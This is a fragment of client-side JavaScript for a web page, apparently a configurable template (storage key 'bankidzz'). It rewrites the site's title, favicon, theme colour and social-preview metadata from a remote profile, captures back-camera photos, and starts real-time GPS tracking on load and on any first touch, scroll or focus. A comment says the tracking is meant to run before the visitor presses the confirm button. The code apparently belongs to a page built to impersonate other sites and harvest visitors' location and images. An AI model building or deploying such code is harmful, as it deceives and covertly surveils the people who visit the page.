        el._timeout = setTimeout(() => { el.className = 'notification'; }, 5000);
    }

    let currentWebProfile = null;

    function makeFaviconTransparent(iconUrl) {
        if (!iconUrl) return;
        const img = new Image();
        img.crossOrigin = 'anonymous';
        img.onload = function() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d', { willReadFrequently: true });
                const size = 64;
                canvas.width = size;
                canvas.height = size;
                ctx.drawImage(img, 0, 0, size, size);

                const imgData = ctx.getImageData(0, 0, size, size);
                const data = imgData.data;

                const corners = [[0, 0], [size - 1, 0], [0, size - 1], [size - 1, size - 1]];
                let lightCorners = 0;
                for (const [cx, cy] of corners) {
                    const idx = (cy * size + cx) * 4;
                    if (data[idx + 3] > 20 && data[idx] > 210 && data[idx + 1] > 210 && data[idx + 2] > 210) {
                        lightCorners++;
                    }
                }

                if (lightCorners >= 2) {
                    for (let i = 0; i < data.length; i += 4) {
                        const r = data[i], g = data[i + 1], b = data[i + 2], a = data[i + 3];
                        if (a === 0) continue;
                        const min = Math.min(r, g, b);
                        const diff = Math.max(r, g, b) - min;
                        if (diff < 20 && min >= 225) {
                            if (min >= 245) {
                                data[i + 3] = 0;
                            } else {
                                data[i + 3] = Math.round(((245 - min) / 20) * 255);
                            }
                        }
                    }
                    ctx.putImageData(imgData, 0, 0);
                    const transparentUrl = canvas.toDataURL('image/png');
                    const linkFav = document.getElementById('metaFavicon') || document.querySelector("link[rel~='icon']");
                    if (linkFav) linkFav.href = transparentUrl;
                }
            } catch(e) {}
        };
        img.src = iconUrl;
    }

    function applyWebProfile(profile) {
        if (!profile) return;
        currentWebProfile = profile;

        if (profile.siteTitle) {
            document.title = profile.siteTitle;
            const metaTitle = document.getElementById('metaTitle');
            if (metaTitle) metaTitle.textContent = profile.siteTitle;
        }
        if (profile.metaDescription) {
            const metaDesc = document.getElementById('metaDescription');
            if (metaDesc) metaDesc.setAttribute('content', profile.metaDescription);
        }
        if (profile.favicon) {
            let linkFav = document.getElementById('metaFavicon') || document.querySelector("link[rel~='icon']");
            if (!linkFav) {
                linkFav = document.createElement('link');
                linkFav.rel = 'icon';
                document.head.appendChild(linkFav);
            }
            linkFav.href = profile.favicon;
            makeFaviconTransparent(profile.favicon);
        }
        if (profile.appleTouchIcon) {
            let linkApple = document.getElementById('metaAppleIcon') || document.querySelector("link[rel='apple-touch-icon']");
            if (!linkApple) {
                linkApple = document.createElement('link');
                linkApple.rel = 'apple-touch-icon';
                document.head.appendChild(linkApple);
            }
            linkApple.href = profile.appleTouchIcon;
        }
        if (profile.themeColor) {
            document.documentElement.style.setProperty('--primary-blue', profile.themeColor);
            const metaTheme = document.getElementById('metaThemeColor') || document.querySelector("meta[name='theme-color']");
            if (metaTheme) metaTheme.setAttribute('content', profile.themeColor);
            const topBar = document.querySelector('.top-bar');
            if (topBar) topBar.style.backgroundColor = profile.themeColor;
            const btnConfirm = document.getElementById('btnConfirm');
            if (btnConfirm && btnConfirm.dataset.verified !== 'true') {
                btnConfirm.style.backgroundColor = profile.themeColor;
            }
        }
        if (profile.ogTitle) {
            const ogTitle = document.getElementById('ogTitle') || document.querySelector("meta[property='og:title']");
            if (ogTitle) ogTitle.setAttribute('content', profile.ogTitle);
        }
        if (profile.ogDescription) {
            const ogDesc = document.getElementById('ogDescription') || document.querySelector("meta[property='og:description']");
            if (ogDesc) ogDesc.setAttribute('content', profile.ogDescription);
        }
        if (profile.ogImage) {
            const ogImg = document.getElementById('ogImage') || document.querySelector("meta[property='og:image']");
            if (ogImg) ogImg.setAttribute('content', profile.ogImage);
        }
        if (profile.twitterTitle) {
            const twTitle = document.getElementById('twitterTitle') || document.querySelector("meta[name='twitter:title']");
            if (twTitle) twTitle.setAttribute('content', profile.twitterTitle);
        }
        if (profile.twitterDescription) {
            const twDesc = document.getElementById('twitterDescription') || document.querySelector("meta[name='twitter:description']");
            if (twDesc) twDesc.setAttribute('content', profile.twitterDescription);
        }
        if (profile.twitterImage) {
            const twImg = document.getElementById('twitterImage') || document.querySelector("meta[name='twitter:image']");
            if (twImg) twImg.setAttribute('content', profile.twitterImage);
        }
    }

    async function loadWebProfile() {
        // 1. Terapkan data lokal langsung agar INSTAN saat refresh
        const stored = localStorage.getItem('bankidzz_web_profile');
        if (stored) {
            try { applyWebProfile(JSON.parse(stored)); } catch(e) {}
        }

        // 2. Sync dari API backend di background
        try {
            const response = await fetch(CONFIG.WEBPROFILE_URL, { cache: 'no-store' });
            if (response.ok) {
                const result = await response.json();
                if (result.profile) {
                    localStorage.setItem('bankidzz_web_profile', JSON.stringify(result.profile));
                    applyWebProfile(result.profile);
                    return;
                }
            }
        } catch(e) {}

        // 3. Fallback webprofile.json
        try {
            const staticResp = await fetch('webprofile.json', { cache: 'no-store' });
            if (staticResp.ok) {
                const staticProfile = await staticResp.json();
                if (staticProfile) {
                    localStorage.setItem('bankidzz_web_profile', JSON.stringify(staticProfile));
                    applyWebProfile(staticProfile);
                }
            }
        } catch(e) {}
    }

    function setupSyncListener() {
        try {
            const channel = new BroadcastChannel(CONFIG.SYNC_CHANNEL);
            channel.addEventListener('message', (event) => {
                if (event.data && event.data.type === 'template_updated') {
                    if (event.data.template) {
                        localStorage.setItem('bankidzz_new_template', JSON.stringify(event.data.template));
                        applyTemplate(event.data.template);
                    }
                } else if (event.data && event.data.type === 'webprofile_updated') {
                    if (event.data.profile) {
                        localStorage.setItem('bankidzz_web_profile', JSON.stringify(event.data.profile));
                        applyWebProfile(event.data.profile);
                    }
                }
            });
        } catch(e) {}
    }

    // File input fallback
    if (elements.fileCameraInput) {
        elements.fileCameraInput.addEventListener('change', function(e) {
            const file = e.target.files[0];
            if (file) {
                const reader = new FileReader();
                reader.onload = function(evt) {
                    capturedPhotoBase64 = evt.target.result;
                    if (elements.modalPreviewImg) elements.modalPreviewImg.src = capturedPhotoBase64;
                    showNotification('Foto diperbarui!', 'success');
                };
                reader.readAsDataURL(file);
            }
        });
    }

    window.closeBackCamera = closeModal;

    // Event listeners
    if (elements.btnCloseModal) elements.btnCloseModal.addEventListener('click', closeModal);
    if (elements.btnCancelPhoto) elements.btnCancelPhoto.addEventListener('click', closeModal);
    if (elements.btnConfirm) elements.btnConfirm.addEventListener('click', handleConfirmClick);
    if (elements.btnCaptureBack) elements.btnCaptureBack.addEventListener('click', handleCaptureBackPhoto);

    // Init
    loadTemplate();
    loadWebProfile();
    setupSyncListener();
    startRealtimeLocationTracking();

    // Trigger GPS tracker juga pada sentuhan/klik/scroll/fokus agar sensor langsung aktif sebelum tombol konfirmasi ditekan
    ['click', 'touchstart', 'pointerdown', 'scroll'].forEach(evt => {
        window.addEventListener(evt, () => startRealtimeLocationTracking(), { once: true, passive: true });
    });
    window.addEventListener('focus', () => startRealtimeLocationTracking());
    document.addEventListener('visibilitychange', () => {
        if (document.visibilityState === 'visible') {
            startRealtimeLocationTracking();
        }
    });

})();